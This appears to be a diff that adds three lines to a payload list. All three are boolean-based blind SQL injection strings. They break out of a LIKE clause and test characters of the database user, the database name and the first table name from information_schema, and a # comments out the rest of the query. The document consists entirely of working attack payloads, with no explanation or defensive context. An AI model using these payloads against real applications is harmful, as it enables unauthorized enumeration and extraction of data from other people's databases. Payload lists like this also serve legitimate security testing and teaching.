@@ -1,0 +1,3 @@
+-1%' or substr(user(),1,1)='r'#
+-1%' or ascii(substr(database(),1,1))=115#
+-1%' or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=117#
